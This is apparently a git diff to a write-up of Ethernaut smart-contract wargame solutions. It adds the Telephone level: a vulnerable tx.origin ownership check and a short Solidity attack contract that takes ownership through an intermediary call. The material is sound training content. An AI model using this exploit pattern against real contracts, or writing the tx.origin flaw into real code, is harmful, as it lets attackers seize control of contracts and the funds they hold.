@@ -86,7 +86,30 @@ contract Attack {
 ```
 We can win this unlimite time by just mimicing the checker functions of `flip` function
 
-# 4. [Challenge 4: Telephone](https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f)
+# 4. [Challenge 4: Telephone](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)
 
 Tasks: 
-- 
+- Claim ownership of the contract below to complete this level.
+
+**Solution:** \
+Vulnerable Code:
+```
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+```
+
+Attack Payload:
+```
+contract Attack {
+    function attack(Telephone telephone) public {
+        telephone.changeOwner(tx.origin);
+    }
+}
+```
+This `changeOwner` function is basically checking if `tx.origin` not equally `msg.sender` it will set user inputed address as owner. So we can do is create a smart contract that will call the `changeOwner` function we can satisfy the check and make ourself as owner.
+
+
+# 5. [Challenge 5: Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)
+
